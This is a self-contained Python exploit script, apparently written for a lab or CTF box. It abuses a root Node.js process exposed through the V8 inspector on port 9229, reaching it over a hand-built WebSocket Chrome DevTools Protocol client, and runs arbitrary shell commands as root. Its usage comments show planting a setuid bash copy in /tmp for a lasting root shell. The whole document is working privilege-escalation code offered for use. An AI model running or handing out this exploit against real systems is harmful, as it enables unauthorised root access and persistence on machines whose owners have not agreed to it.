#!/usr/bin/env python3
# Node.js --inspect (V8 Inspector / CDP) RCE client -- stdlib only.
# Target: root process `node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js`
# Runs the given shell command IN the root node process context => command runs as root.
#
# Usage (on the box, as engineer):
#   python3 cdp_root.py 'id'
#   python3 cdp_root.py 'cp /bin/bash /tmp/0 && chmod 4755 /tmp/0'   # then: /tmp/0 -p
import socket, base64, os, json, struct, sys, urllib.request

HOST, PORT = "127.0.0.1", 9229
CMD = sys.argv[1] if len(sys.argv) > 1 else "id"

# 1) discover the WebSocket debugger URL
info = json.load(urllib.request.urlopen(f"http://{HOST}:{PORT}/json/list", timeout=5))
ws_url = info[0]["webSocketDebuggerUrl"]          # ws://127.0.0.1:9229/<uuid>
path = "/" + ws_url.split("/", 3)[3]

# 2) WebSocket handshake
key = base64.b64encode(os.urandom(16)).decode()
req = (f"GET {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
       "Upgrade: websocket\r\nConnection: Upgrade\r\n"
       f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
s = socket.create_connection((HOST, PORT), timeout=5)
s.sendall(req.encode())
resp = s.recv(4096)
if b"101" not in resp.split(b"\r\n", 1)[0]:
    sys.exit("[!] WebSocket handshake failed:\n" + resp.decode(errors="replace"))

def ws_send(obj):
    payload = json.dumps(obj).encode()
    mask = os.urandom(4)
    hdr = bytearray([0x81])                        # FIN + text frame
    ln = len(payload)
    if ln < 126:
        hdr.append(0x80 | ln)
    elif ln < 65536:
        hdr.append(0x80 | 126); hdr += struct.pack(">H", ln)
    else:
        hdr.append(0x80 | 127); hdr += struct.pack(">Q", ln)
    hdr += mask
    s.sendall(bytes(hdr) + bytes(b ^ mask[i % 4] for i, b in enumerate(payload)))

def ws_recv():
    b = s.recv(2)
    ln = b[1] & 0x7f
    if ln == 126:
        ln = struct.unpack(">H", s.recv(2))[0]
    elif ln == 127:
        ln = struct.unpack(">Q", s.recv(8))[0]
    data = b""
    while len(data) < ln:
        data += s.recv(ln - len(data))
    return data

# 3) evaluate: run the command via child_process in the (root) process
expr = ("(function(){var cp=(process.mainModule&&process.mainModule.require)"
        "?process.mainModule.require('child_process'):require('child_process');"
        "return cp.execSync(" + json.dumps(CMD) + ",{encoding:'utf8'});})()")
ws_send({"id": 1, "method": "Runtime.evaluate",
         "params": {"expression": expr, "returnByValue": True, "includeCommandLineAPI": True}})

# read frames until we get our id:1 result
for _ in range(10):
    msg = json.loads(ws_recv().decode(errors="replace"))
    if msg.get("id") == 1:
        r = msg.get("result", {})
        if "exceptionDetails" in r:
            print("[!] exception:", json.dumps(r["exceptionDetails"]))
        else:
            print(r.get("result", {}).get("value", ""), end="")
        break
